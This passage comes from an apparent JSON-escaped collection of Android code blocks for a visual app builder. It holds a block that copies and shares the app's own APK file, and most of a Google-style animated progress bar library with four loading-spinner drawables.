\n\t\t\t\t\t\t\t\tjava.io.File tempFile \u003d new java.io.File(getExternalCacheDir() + \"/ExtractedApk\"); \n\t\t\t\t\t\t \t\tif (!tempFile.isDirectory()) \n\t\t\t\t\t\t\t\t\tif (!tempFile.mkdirs()) \n\t\t\t\t\t\t\t\t\treturn; \n\t\t\t\t\t\t\t\t\ttempFile \u003d new java.io.File(tempFile.getPath() + \"/\" + \n\t\t\t\t\t\t\t\t\t%1$s);\n\t\t\t\t\t\t\t\t\tif (!tempFile.exists()) \n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\ttry{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif (!tempFile.createNewFile()) { \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treturn; }\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcatch (java.io.IOException e){} \n\t\t\t\t\t\t\t\t\t\t} \n\t\t\t\t\t\t\t\t\tjava.io.InputStream in \u003d new java.io.FileInputStream (originalApk);\n\t\t\t\t\t\t\t\t\tjava.io.OutputStream out \u003d new java.io.FileOutputStream(tempFile);\n\t\t\t\t\t\t\t\t\tbyte[] buf \u003d new byte[1024];\n\t\t\t\t\t\t\t\t\tint len; \n\t\t\t\t\t\t\t\t\twhile ((len \u003d in.read(buf)) \u003e 0) { \n\t\t\t\t\t\t\t\t\t\t\t\tout.write(buf, 0, len); \n\t\t\t\t\t\t\t\t\t} \n\t\t\t\t\t\t\t\t\tin.close(); \n\t\t\t\t\t\t\t\t\tout.close(); \n\t\t\t\t\t\t\t\t\tintent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(tempFile));\n\t\t\t\t\t\t\t\t\tstartActivity(Intent.createChooser(intent, %2$s));\n\t\t\t\t\t\t} \n\t\t\t\t\t\tcatch (java.io.IOException e) \n\t\t\t\t\t\t{ showMessage(e.toString()); \n\t\t\t\t\t\t} \n\t\t\t}\n{","name":"ShareApkLibMoreblock","palette":"-1","type":" ","spec":"##Share apk with name (example : myApp.apk) %s and shareInfo %s (add to Mblock)##"},{"code":"}\npublic static class GoogleProgressBar extends ProgressBar {\n\tpublic static int _type \u003d 0;\n\tpublic static int[] _color \u003d new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}; //Red, blue, yellow, green\n    private enum ProgressType {\n        FOLDING_CIRCLES,\n        GOOGLE_MUSIC_DICES,\n        NEXUS_ROTATION_CROSS,\n        CHROME_FLOATING_CIRCLES\n    }\n    public GoogleProgressBar(Context context) {\n        this(context, null);\n    }\n    public GoogleProgressBar(Context context, AttributeSet attrs) {\n        this(context, attrs,android.R.attr.progressBarStyle);\n    }\n    public GoogleProgressBar(Context context, AttributeSet attrs, int defStyle) {\n        super(context, attrs, defStyle);\n        if (isInEditMode())\n            return;\n        final int typeIndex \u003d _type;\n\t\tfinal int[] colorsId \u003d _color;\n        android.graphics.drawable.Drawable drawable \u003d buildDrawable(context,typeIndex,colorsId);\n        if(drawable!\u003dnull)\n        setIndeterminateDrawable(drawable);\n    }\n    private android.graphics.drawable.Drawable buildDrawable(Context context, int typeIndex,int[] colorsId) {\n        android.graphics.drawable.Drawable drawable \u003d null;\n        ProgressType type \u003d ProgressType.values()[typeIndex];\n        switch (type){\n            case FOLDING_CIRCLES:\n                drawable \u003d new FoldingCirclesDrawable.Builder(context).colors(colorsId).build();\n                break;\n            case GOOGLE_MUSIC_DICES:\n                drawable \u003d new GoogleMusicDicesDrawable.Builder().build();\n                break;\n            case NEXUS_ROTATION_CROSS:\n                drawable \u003d new NexusRotationCrossDrawable.Builder(context).colors(colorsId).build();\n                break;\n            case CHROME_FLOATING_CIRCLES:\n                drawable \u003d new ChromeFloatingCirclesDrawable.Builder(context).colors(colorsId).build();\n                break;\n        }\n        return drawable;\n    }\n    public static void setType(int types) {\n    \t_type \u003d types;\n    }\n    public static void setColor(int[] colors) {\n    \t_color \u003d colors;\n    }\n}\n\n\npublic static class NexusRotationCrossDrawable extends android.graphics.drawable.Drawable implements android.graphics.drawable.Drawable.Callback {\n    private static int ANIMATION_DURATION \u003d 150;\n    private static int ANIMATION_START_DELAY \u003d 300;\n    private static final android.view.animation.Interpolator LINEAR_INTERPOLATOR \u003d new LinearInterpolator();\n    private int mCenter;\n    private Point[] mArrowPoints;\n    private Path mPath;\n    private Paint mPaint1;\n    private Paint mPaint2;\n    private Paint mPaint3;\n    private Paint mPaint4;\n    private int mRotationAngle;\n    public NexusRotationCrossDrawable(int[] colors) {\n        mArrowPoints \u003d new Point[5];\n        mPath \u003d new Path();\n        mPaint1 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint1.setColor(colors[0]);\n        mPaint2 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint2.setColor(colors[1]);\n        mPaint3 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint3.setColor(colors[2]);\n        mPaint4 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint4.setColor(colors[3]);\n        initObjectAnimator();\n    }\n    private void initObjectAnimator() {\n        final ObjectAnimator objectAnimator \u003d ObjectAnimator.ofInt(this, \"rotationAngle\", 0, 180);\n        objectAnimator.setInterpolator(LINEAR_INTERPOLATOR);\n        objectAnimator.setDuration(ANIMATION_DURATION);\n        objectAnimator.addListener(new AnimatorListenerAdapter() {\n            @Override\n            public void onAnimationEnd(Animator animation) {\n                if (mRotationAngle \u003d\u003d 180) {\n                    objectAnimator.setIntValues(180, 360);\n                    objectAnimator.setStartDelay(ANIMATION_START_DELAY * 2);\n                } else {\n                    objectAnimator.setIntValues(0, 180);\n                    objectAnimator.setStartDelay(ANIMATION_START_DELAY);\n                    mRotationAngle \u003d 0;\n                }\n                objectAnimator.start();\n            }\n        });\n        objectAnimator.start();\n    }\n    @Override\n    public void draw(Canvas canvas) {\n        drawArrows(canvas);\n    }\n    private void drawArrows(Canvas canvas) {\n        canvas.rotate(mRotationAngle, mCenter, mCenter);\n        mPath.reset();\n        mPath.moveTo(mArrowPoints[0].x, mArrowPoints[0].y);\n        for (int i \u003d 1; i \u003c mArrowPoints.length; i++) {\n            mPath.lineTo(mArrowPoints[i].x, mArrowPoints[i].y);\n        }\n        mPath.lineTo(mArrowPoints[0].x, mArrowPoints[0].y);\n        canvas.save();\n        canvas.drawPath(mPath, mPaint1);\n        canvas.restore();\n        canvas.save();\n        canvas.rotate(90, mCenter, mCenter);\n        canvas.drawPath(mPath, mPaint2);\n        canvas.restore();\n        canvas.save();\n        canvas.rotate(180, mCenter, mCenter);\n        canvas.drawPath(mPath, mPaint3);\n        canvas.restore();\n        canvas.save();\n        canvas.rotate(270, mCenter, mCenter);\n        canvas.drawPath(mPath, mPaint4);\n        canvas.restore();\n    }\n    @Override\n    public void invalidateDrawable(android.graphics.drawable.Drawable who) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.invalidateDrawable(this);\n        }\n    }\n    @Override\n    public void scheduleDrawable(android.graphics.drawable.Drawable who, Runnable what, long when) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.scheduleDrawable(this, what, when);\n        }\n    }\n    @Override\n    public void unscheduleDrawable(android.graphics.drawable.Drawable who, Runnable what) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.unscheduleDrawable(this, what);\n        }\n    }\n    @Override\n    public void setAlpha(int alpha) {\n        mPaint1.setAlpha(alpha);\n        mPaint2.setAlpha(alpha);\n        mPaint3.setAlpha(alpha);\n        mPaint4.setAlpha(alpha);\n    }\n    @Override\n    public void setColorFilter(ColorFilter cf) {\n        mPaint1.setColorFilter(cf);\n        mPaint2.setColorFilter(cf);\n        mPaint3.setColorFilter(cf);\n        mPaint4.setColorFilter(cf);\n    }\n    @Override\n    protected void onBoundsChange(Rect bounds) {\n        super.onBoundsChange(bounds);\n        measureDrawable(bounds);\n    }\n    private void measureDrawable(Rect bounds) {\n        mCenter \u003d bounds.centerX();\n        int arrowMargin \u003d bounds.width() / 50;\n        int arrowWidth \u003d bounds.width() / 15;\n        int padding \u003d mCenter - (int) (mCenter /  Math.sqrt(2));\n        mArrowPoints[0] \u003d new Point(mCenter - arrowMargin, mCenter - arrowMargin);\n        mArrowPoints[1] \u003d new Point(mArrowPoints[0].x, mArrowPoints[0].y - arrowWidth);\n        mArrowPoints[2] \u003d new Point(padding + arrowWidth, padding);\n        mArrowPoints[3] \u003d new Point(padding, padding + arrowWidth);\n        mArrowPoints[4] \u003d new Point(mArrowPoints[0].x - arrowWidth, mArrowPoints[0].y);\n    }\n    @Override\n    public int getOpacity() {\n        return PixelFormat.TRANSLUCENT;\n    }\n    void setRotationAngle(int angle) {\n        mRotationAngle \u003d angle;\n    }\n    int getRotationAngle() {\n        return mRotationAngle;\n    }\n    public static class Builder {\n        private int[] mColors;\n        public Builder(Context context) {\n            initDefaults(context);\n        }\n        \n        private void initDefaults(Context context) {\n            mColors \u003d new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}; //Red, blue, yellow, green\n        }\n        \n        public Builder colors(int[] colors) {\n            if (colors \u003d\u003d null || colors.length !\u003d 4) {\n                throw new IllegalArgumentException(\"Your color array must contains 4 values\");\n            }\n            mColors \u003d colors;\n            return this;\n        }\n        public android.graphics.drawable.Drawable build() {\n            return new NexusRotationCrossDrawable(mColors);\n        }\n    }\n}\n\n\npublic static class GoogleMusicDicesDrawable extends android.graphics.drawable.Drawable implements android.graphics.drawable.Drawable.Callback {\n    private static final int DICE_SIDE_COLOR \u003d Color.parseColor(\"#FFDBDBDB\");\n    private static final int DICE_SIDE_SHADOW_COLOR \u003d Color.parseColor(\"#FFB8B8B9\");\n    private static final int ANIMATION_DURATION \u003d 350;\n    private static final int ANIMATION_START_DELAY \u003d 150;\n    private static final android.view.animation.Interpolator ACCELERATE_INTERPOLATOR \u003d new AccelerateInterpolator();\n    private Paint mPaint;\n    private Paint mPaintShadow;\n    private Paint mPaintCircle;\n    private int mSize;\n    private float mScale;\n    private DiceRotation mDiceRotation;\n    private DiceState[] mDiceStates;\n    private int mDiceState;\n    private enum DiceSide {\n        ONE,\n        TWO,\n        THREE,\n        FOUR,\n        FIVE,\n        SIX\n    }\n    private enum DiceRotation {\n        LEFT,\n        DOWN;\n\n        DiceRotation invert() {\n            return this \u003d\u003d LEFT ? DOWN : LEFT;\n        }\n    }\n    private class DiceState {\n        private DiceSide side1;\n        private DiceSide side2;\n        DiceState(DiceSide side1, DiceSide side2) {\n            this.side1 \u003d side1;\n            this.side2 \u003d side2;\n        }\n    }\n    public GoogleMusicDicesDrawable() {\n        init();\n    }\n    private void init() {\n        mPaint \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint.setColor(DICE_SIDE_COLOR);\n        mPaintShadow \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaintShadow.setColor(DICE_SIDE_SHADOW_COLOR);\n        mPaintCircle \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaintCircle.setColor(Color.WHITE);\n        mDiceStates \u003d new DiceState[] {\n                new DiceState(DiceSide.ONE, DiceSide.THREE),\n                new DiceState(DiceSide.TWO, DiceSide.THREE),\n                new DiceState(DiceSide.TWO, DiceSide.SIX),\n                new DiceState(DiceSide.FOUR, DiceSide.SIX),\n                new DiceState(DiceSide.FOUR, DiceSide.FIVE),\n                new DiceState(DiceSide.ONE, DiceSide.FIVE)\n        };\n        mDiceRotation \u003d DiceRotation.LEFT;\n        initObjectAnimator();\n    }\n    private void initObjectAnimator() {\n        final ObjectAnimator objectAnimator \u003d ObjectAnimator.ofFloat(this, \"scale\", 0, 1);\n        objectAnimator.setInterpolator(ACCELERATE_INTERPOLATOR);\n        objectAnimator.setDuration(ANIMATION_DURATION);\n        objectAnimator.setStartDelay(ANIMATION_START_DELAY);\n        objectAnimator.addListener(new AnimatorListenerAdapter() {\n            @Override\n            public void onAnimationEnd(Animator animation) {\n                mScale \u003d 0;\n                mDiceState++;\n                if (mDiceState \u003d\u003d mDiceStates.length) {\n                    mDiceState \u003d 0;\n                }\n                mDiceRotation \u003d mDiceRotation.invert();\n                objectAnimator.start();\n            }\n        });\n        objectAnimator.start();\n    }\n    @Override\n    public void draw(Canvas canvas) {\n        if (mDiceRotation !\u003d null) {\n            switch (mDiceRotation) {\n                case DOWN:\n                    drawScaleY(canvas);\n                    break;\n                case LEFT:\n                    drawScaleX(canvas);\n                    break;\n            }\n        }\n    }\n    @Override\n    public void setAlpha(int alpha) {\n        mPaint.setAlpha(alpha);\n        mPaintShadow.setAlpha(alpha);\n        mPaintCircle.setAlpha(alpha);\n    }\n    @Override\n    public void setColorFilter(ColorFilter cf) {\n        mPaint.setColorFilter(cf);\n        mPaintShadow.setColorFilter(cf);\n        mPaintCircle.setColorFilter(cf);\n    }\n    @Override\n    public int getOpacity() {\n        return PixelFormat.TRANSLUCENT;\n    }\n    @Override\n    protected void onBoundsChange(Rect bounds) {\n        super.onBoundsChange(bounds);\n        mSize \u003d bounds.width();\n    }\n    @Override\n    public void invalidateDrawable(android.graphics.drawable.Drawable who) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.invalidateDrawable(this);\n        }\n    }\n    @Override\n    public void scheduleDrawable(android.graphics.drawable.Drawable who, Runnable what, long when) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.scheduleDrawable(this, what, when);\n        }\n    }\n    @Override\n    public void unscheduleDrawable(android.graphics.drawable.Drawable who, Runnable what) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.unscheduleDrawable(this, what);\n        }\n    }\n    private void drawScaleX(Canvas canvas) {\n        canvas.save();\n        Matrix matrix \u003d new Matrix();\n        matrix.preScale(1 - mScale, 1, 0, mSize / 2);\n        canvas.concat(matrix);\n        drawDiceSide(canvas, mDiceStates[mDiceState].side1, mScale \u003e 0.1f);\n        canvas.restore();\n        canvas.save();\n        matrix \u003d new Matrix();\n        matrix.preScale(mScale, 1, mSize, mSize / 2);\n        canvas.concat(matrix);\n        drawDiceSide(canvas, mDiceStates[mDiceState].side2, false);\n        canvas.restore();\n    }\n    private void drawScaleY(Canvas canvas) {\n        canvas.save();\n        Matrix matrix \u003d new Matrix();\n        matrix.preScale(1, mScale, mSize / 2, 0);\n        canvas.concat(matrix);\n        drawDiceSide(canvas, mDiceStates[mDiceState].side1, false);\n        canvas.restore();\n        canvas.save();\n        matrix \u003d new Matrix();\n        matrix.preScale(1, 1 - mScale, mSize / 2, mSize);\n        canvas.concat(matrix);\n        drawDiceSide(canvas, mDiceStates[mDiceState].side2, mScale \u003e 0.1f);\n        canvas.restore();\n    }\n    private void drawDiceSide(Canvas canvas, DiceSide side, boolean shadow) {\n        int circleRadius \u003d mSize / 10;\n        canvas.drawRect(0, 0, mSize, mSize, shadow ? mPaintShadow : mPaint);\n        switch (side) {\n            case ONE:\n                canvas.drawCircle(mSize / 2, mSize / 2, circleRadius, mPaintCircle);\n                break;\n            case TWO:\n                canvas.drawCircle(mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                break;\n            case THREE:\n                canvas.drawCircle(mSize / 2, mSize / 2, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize - mSize / 4, mSize / 10, mPaintCircle);\n                break;\n            case FOUR:\n                canvas.drawCircle(mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                break;\n            case FIVE:\n                canvas.drawCircle(mSize / 2, mSize / 2, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                break;\n            case SIX:\n                canvas.drawCircle(mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize / 2, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize / 2, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                break;\n        }\n    }\n    float getScale() {\n        return mScale;\n    }\n    void setScale(float scale) {\n        this.mScale \u003d scale;\n    }\n    public static class Builder {\n        public android.graphics.drawable.Drawable build() {\n            return new GoogleMusicDicesDrawable();\n        }\n    }\n}\n\n\npublic static class FoldingCirclesDrawable extends android.graphics.drawable.Drawable implements android.graphics.drawable.Drawable.Callback {\n    private static final float MAX_LEVEL \u003d 10000;\n    private static final float CIRCLE_COUNT \u003d ProgressStates.values().length;\n    private static final float MAX_LEVEL_PER_CIRCLE \u003d MAX_LEVEL / CIRCLE_COUNT;\n    private static final int ALPHA_OPAQUE \u003d 255;\n    private static final int ALPHA_ABOVE_DEFAULT \u003d 235;\n    private Paint mFstHalfPaint;\n    private Paint mScndHalfPaint;\n    private Paint mAbovePaint;\n    private RectF mOval \u003d new RectF();\n    private int mDiameter;\n    private Path mPath;\n    private int mHalf;\n    private ProgressStates mCurrentState;\n    private int mControlPointMinimum;\n    private int mControlPointMaximum;\n    private int mAxisValue;\n    private int mAlpha \u003d ALPHA_OPAQUE;\n    private ColorFilter mColorFilter;\n    private static int mColor1;\n    private static int mColor2;\n    private static int mColor3;\n    private static int mColor4;\n    private int fstColor, scndColor;\n    private boolean goesBackward;\n    private enum ProgressStates {\n        FOLDING_DOWN,\n        FOLDING_LEFT,\n        FOLDING_UP,\n        FOLDING_RIGHT\n    }\n    public FoldingCirclesDrawable(int[] colors) {\n        initCirclesProgress(colors);\n    }\n    private void initCirclesProgress(int[] colors) {\n        initColors(colors);\n        mPath \u003d new Path();\n        Paint basePaint \u003d new Paint();\n        basePaint.setAntiAlias(true);\n        mFstHalfPaint \u003d new Paint(basePaint);\n        mScndHalfPaint \u003d new Paint(basePaint);\n        mAbovePaint \u003d new Paint(basePaint);\n        setAlpha(mAlpha);\n        setColorFilter(mColorFilter);\n    }\n    private void initColors(int[] colors) {\n        mColor1\u003dcolors[0];\n        mColor2\u003dcolors[1];\n        mColor3\u003dcolors[2];\n        mColor4\u003dcolors[3];\n    }\n    @Override\n    protected void onBoundsChange(Rect bounds) {\n        super.onBoundsChange(bounds);\n        measureCircleProgress(bounds.width(), bounds.height());\n    }\n    @Override\n    protected boolean onLevelChange(int level) {\n        int animationLevel \u003d level \u003d\u003d MAX_LEVEL ? 0 : level;\n        int stateForLevel \u003d (int) (animationLevel / MAX_LEVEL_PER_CIRCLE);\n        mCurrentState \u003d ProgressStates.values()[stateForLevel];\n        resetColor(mCurrentState);\n        int levelForCircle \u003d (int) (animationLevel % MAX_LEVEL_PER_CIRCLE);\n        boolean halfPassed;\n        if (!goesBackward) {\n            halfPassed \u003d levelForCircle !\u003d (int) (animationLevel % (MAX_LEVEL_PER_CIRCLE / 2));\n        } else {\n            halfPassed \u003d levelForCircle \u003d\u003d (int) (animationLevel % (MAX_LEVEL_PER_CIRCLE / 2));\n            levelForCircle \u003d (int) (MAX_LEVEL_PER_CIRCLE - levelForCircle);\n        }\n        mFstHalfPaint.setColor(fstColor);\n        mScndHalfPaint.setColor(scndColor);\n        if (!halfPassed) {\n            mAbovePaint.setColor(mScndHalfPaint.getColor());\n        } else {\n            mAbovePaint.setColor(mFstHalfPaint.getColor());\n        }\n        setAlpha(mAlpha);\n        mAxisValue \u003d (int) (mControlPointMinimum + (mControlPointMaximum - mControlPointMinimum) * (levelForCircle / MAX_LEVEL_PER_CIRCLE));\n        return true;\n    }\n    private void resetColor(ProgressStates currentState) {\n        switch (currentState){\n            case FOLDING_DOWN:\n                fstColor\u003d mColor1;\n                scndColor\u003dmColor2;\n                goesBackward\u003dfalse;\n            break;\n            case FOLDING_LEFT:\n                fstColor\u003d mColor1;\n                scndColor\u003dmColor3;\n                goesBackward\u003dtrue;\n                break;\n            case FOLDING_UP:\n                fstColor\u003d mColor3;\n                scndColor\u003dmColor4;\n                goesBackward\u003dtrue;\n                break;\n            case FOLDING_RIGHT:\n                fstColor\u003dmColor2;\n                scndColor\u003dmColor4;\n                goesBackward\u003dfalse;\n                break;\n        }\n    }\n    @Override\n    public void draw(Canvas canvas) {\n        if (mCurrentState !\u003d null) {\n            makeCirclesProgress(canvas);\n        }\n    }\n    private void measureCircleProgress(int width, int height) {\n        mDiameter \u003d Math.min(width, height);\n        mHalf \u003d mDiameter / 2;\n        mOval.set(0, 0, mDiameter, mDiameter);\n        mControlPointMinimum \u003d -mDiameter / 6;\n        mControlPointMaximum \u003d mDiameter + mDiameter / 6;\n    }\n    private void makeCirclesProgress(Canvas canvas) {\n        switch (mCurrentState) {\n            case FOLDING_DOWN:\n            case FOLDING_UP:\n                drawYMotion(canvas);\n                break;\n            case FOLDING_RIGHT:\n            case FOLDING_LEFT:\n                drawXMotion(canvas);\n                break;\n        }\n        canvas.drawPath(mPath, mAbovePaint);\n    }\n    private void drawXMotion(Canvas canvas) {\n        canvas.drawArc(mOval, 90, 180, true, mFstHalfPaint);\n        canvas.drawArc(mOval, -270, -180, true, mScndHalfPaint);\n        mPath.reset();\n        mPath.moveTo(mHalf, 0);\n        mPath.cubicTo(mAxisValue, 0, mAxisValue, mDiameter, mHalf, mDiameter);\n        mPath.moveTo(mHalf+1, 0);\n        mPath.cubicTo(mAxisValue, 0, mAxisValue, mDiameter, mHalf+1, mDiameter);\n    }\n    private void drawYMotion(Canvas canvas) {\n        canvas.drawArc(mOval, 0, -180, true, mFstHalfPaint);\n        canvas.drawArc(mOval, -180, -180, true, mScndHalfPaint);\n        mPath.reset();\n        mPath.moveTo(0, mHalf);\n        mPath.cubicTo(0, mAxisValue, mDiameter, mAxisValue, mDiameter, mHalf);\n        mPath.moveTo(0, mHalf+1);\n        mPath.cubicTo(0, mAxisValue, mDiameter, mAxisValue, mDiameter, mHalf+1);\n    }\n    @Override\n    public void setAlpha(int alpha) {\n        this.mAlpha \u003d alpha;\n        mFstHalfPaint.setAlpha(alpha);\n        mScndHalfPaint.setAlpha(alpha);\n        int targetAboveAlpha \u003d (ALPHA_ABOVE_DEFAULT * alpha) / ALPHA_OPAQUE;\n        mAbovePaint.setAlpha(targetAboveAlpha);\n    }\n    @Override\n    public void setColorFilter(ColorFilter cf) {\n        this.mColorFilter \u003d cf;\n        mFstHalfPaint.setColorFilter(cf);\n        mScndHalfPaint.setColorFilter(cf);\n        mAbovePaint.setColorFilter(cf);\n    }\n    @Override\n    public int getOpacity() {\n        return PixelFormat.TRANSLUCENT;\n    }\n    @Override\n    public void invalidateDrawable(android.graphics.drawable.Drawable who) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.invalidateDrawable(this);\n        }\n    }\n    @Override\n    public void scheduleDrawable(android.graphics.drawable.Drawable who, Runnable what, long when) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.scheduleDrawable(this, what, when);\n        }\n    }\n    @Override\n    public void unscheduleDrawable(android.graphics.drawable.Drawable who, Runnable what) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.unscheduleDrawable(this, what);\n        }\n    }\n    public static class Builder {\n        private int[] mColors;\n        public Builder(Context context){\n            initDefaults(context);\n        }\n        \n        private void initDefaults(Context context) {\n            //Default values\n            mColors \u003d new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}; //Red, blue, yellow, green\n        }\n        \n        public Builder colors(int[] colors) {\n            if (colors \u003d\u003d null || colors.length \u003d\u003d 0) {\n                throw new IllegalArgumentException(\"Your color array must contains at least 4 values\");\n            }\n            mColors \u003d colors;\n            return this;\n        }\n        public android.graphics.drawable.Drawable build() {\n            return new FoldingCirclesDrawable(mColors);\n        }\n    }\n}\n\n\npublic static class ChromeFloatingCirclesDrawable extends android.graphics.drawable.Drawable implements android.graphics.drawable.Drawable.Callback {\n    private static final int MAX_LEVEL \u003d 10000;\n    private static final int CENT_LEVEL \u003d MAX_LEVEL / 2;\n    private static final int MID_LEVEL \u003d CENT_LEVEL / 2;\n    private static final int ALPHA_OPAQUE \u003d 255;\n    private static final int ACCELERATION_LEVEL \u003d 2;\n    private int mAlpha \u003d ALPHA_OPAQUE;\n    private ColorFilter mColorFilter;\n    private Point[] mArrowPoints;\n    private Paint mPaint1;\n    private Paint mPaint2;\n    private Paint mPaint3;\n    private Paint mPaint4;\n    private double unit;\n    private int width, x_beg, y_beg, x_end, y_end, offset;\n    private int acceleration \u003d ACCELERATION_LEVEL;\n    private double distance \u003d 0.5 * ACCELERATION_LEVEL * MID_LEVEL * MID_LEVEL;\n    private double max_speed; // set in setAcceleration(...);\n    private double offsetPercentage;\n    private int colorSign;\n    private ProgressStates currentProgressStates \u003d ProgressStates.GREEN_TOP;\n    private enum ProgressStates {\n        GREEN_TOP,\n        YELLOW_TOP,\n        RED_TOP,\n        BLUE_TOP\n    }\n    public ChromeFloatingCirclesDrawable(int[] colors) {\n        initCirclesProgress(colors);\n    }\n    private void initCirclesProgress(int[] colors) {\n        initColors(colors);\n        setAlpha(mAlpha);\n        setColorFilter(mColorFilter);\n        setAcceleration(ACCELERATION_LEVEL);\n        offsetPercentage \u003d 0;\n        colorSign \u003d 1; // |\u003d 1, |\u003d 2, |\u003d 4, |\u003d 8 --\u003e 0xF\n    }\n\n    private void initColors(int[] colors) {\n        mPaint1 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint1.setColor(colors[0]);\n        mPaint1.setAntiAlias(true);\n        mPaint2 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint2.setColor(colors[1]);\n        mPaint2.setAntiAlias(true);\n        mPaint3 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint3.setColor(colors[2]);\n        mPaint3.setAntiAlias(true);\n        mPaint4 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint4.setColor(colors[3]);\n        mPaint4.setAntiAlias(true);\n    }\n    @Override\n    protected void onBoundsChange(Rect bounds) {\n        super.onBoundsChange(bounds);\n        measureCircleProgress(bounds.width(), bounds.height());\n    }\n    @Override\n    protected boolean onLevelChange(int level) {\n        level %\u003d MAX_LEVEL / acceleration;\n        final int temp_level \u003d level % (MID_LEVEL / acceleration);\n        final int ef_width \u003d (int)(unit * 3.0); // effective width\n        if(level \u003c CENT_LEVEL / acceleration) { // go\n            if(level \u003c MID_LEVEL / acceleration) {\n                if(colorSign \u003d\u003d 0xF) {\n                    changeTopColor();\n                    colorSign \u003d 1;\n                }\n                offsetPercentage \u003d 0.5 * acceleration * temp_level * temp_level / distance;\n                offset \u003d (int)(offsetPercentage * ef_width / 2); // x and y direction offset\n            }\n            else {\n                colorSign |\u003d 2;\n                // from mid to end\n                offsetPercentage \u003d (max_speed * temp_level\n                        - 0.5 * acceleration * temp_level * temp_level) / distance\n                        + 1.0;\n                offset \u003d (int)(offsetPercentage * ef_width / 2); // x and y direction offset\n            }\n        }\n        else { // back\n            if(level \u003c (CENT_LEVEL + MID_LEVEL) / acceleration) {\n                // set colorSign\n                if(colorSign \u003d\u003d 0x3) {\n                    changeTopColor();\n                    colorSign |\u003d 4;\n                }\n                // from end to mid\n                offsetPercentage \u003d 0.5 * acceleration * temp_level * temp_level  / distance;\n                offset \u003d (int)(ef_width - offsetPercentage * ef_width / 2); // x and y direction offset\n            }\n            else {\n                // set colorSign\n                colorSign |\u003d 8;\n                // from mid to beg\n                offsetPercentage \u003d (max_speed * temp_level\n                        - 0.5 * acceleration * temp_level * temp_level) / distance\n                        + 1.0;\n                offsetPercentage \u003d offsetPercentage \u003d\u003d 1.0 ? 2.0 : offsetPercentage;\n                offset \u003d (int)(ef_width - offsetPercentage * ef_width / 2); // x and y direction offset\n            }\n        }\n\n        mArrowPoints[0].set((int)unit+x_beg+offset, (int)unit+y_beg+offset); // mPaint1, left up\n        mArrowPoints[1].set((int)(unit*4.0)+x_beg-offset, (int)(unit*4.0)+y_beg-offset); // mPaint2, right down\n        mArrowPoints[2].set((int)unit+x_beg+offset, (int)(unit*4.0)+y_beg-offset); // mPaint3, left down\n        mArrowPoints[3].set((int)(unit*4.0)+x_beg-offset, (int)unit+y_beg+offset); // mPaint4, right up\n\n        return true;\n    }\n\n    private void changeTopColor() {\n        switch(currentProgressStates){\n            case GREEN_TOP:\n                currentProgressStates \u003d ProgressStates.YELLOW_TOP;\n                break;\n            case YELLOW_TOP:\n                currentProgressStates \u003d ProgressStates.RED_TOP;\n                break;\n            case RED_TOP:\n                currentProgressStates \u003d ProgressStates.BLUE_TOP;\n                break;\n            case BLUE_TOP:\n                currentProgressStates \u003d ProgressStates.GREEN_TOP;\n                break;\n        }\n    }\n\n    @Override\n    public void draw(Canvas canvas) {\n        // draw circles\n        if(currentProgressStates !\u003d ProgressStates.RED_TOP)\n            canvas.drawCircle(mArrowPoints[0].x, mArrowPoints[0].y, 